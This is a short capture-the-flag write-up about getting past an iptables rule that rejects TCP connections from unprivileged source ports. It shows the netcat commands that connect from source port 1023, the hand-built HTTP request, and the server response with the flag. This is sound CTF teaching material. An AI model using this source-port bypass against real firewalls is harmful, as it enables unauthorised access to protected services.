## The Challenge

For this challenge, we are two pieces of information.

First is a URL to exactly where the flag is located:

    http://172.31.2.97:20621/flag-d12bb978.txt

Second is a link to download the firewall rules. This turns out to be a tar file that extracts to a text file named `port_20621_rules.txt` that contains:

    Chain PORT_20621 (1 references)
    target     prot opt source               destination         
    REJECT     tcp  --  anywhere             anywhere             tcp spts:1024:65535 reject-with icmp-admin-prohibited

## The Solution

Immediately, we can see that the firewall rules we were provided pertain to the port we must access to get our flag. We also might recognize that this is an iptables rule definition that will reject any connection that has a source port in the range 1024-65535.

So we have to find a way to make an HTTP request from a local port that is lower than 1024.

For most network challenges, I start exploring with `netcat`. A quick check of the man page tells us that we can specify a local port with the `-p` option. That means we can quickly test the source port theory.

    # nc -p 1023 172.31.2.97 20621

The connection is not immediately dropped, and sending some text results in a "400 Bad Request" HTTP response, which means we're in.

Now all we need to do is make a valid HTTP GET request for the flag URL through netcat and we should get a response with the flag. With some googling, we're able to reformat the URL we were provided into the following valid request:

    GET /flag-d12bb978.txt HTTP/1.0
    Host: 172.31.2.97:20621

I wanted to keep using netcat, so I used `echo` to send that request into the command we came up with earlier.

    # echo -e "GET /flag-d12bb978.txt HTTP/1.0\nHost: 172.31.2.97:20621\n\n" | nc -p 1023 172.31.2.97 20621
    HTTP/1.1 200 OK
    Server: nginx/1.10.3 (Ubuntu)
    Date: Sun, 12 Aug 2018 00:56:41 GMT
    Content-Type: text/plain
    Content-Length: 29
    Last-Modified: Thu, 09 Aug 2018 23:57:42 GMT
    Connection: close
    ETag: "5b6cd4f6-1d"
    Accept-Ranges: bytes

    pr1vil3ge_h4s_its_privile9e5

And there is our answer, right from the command line.
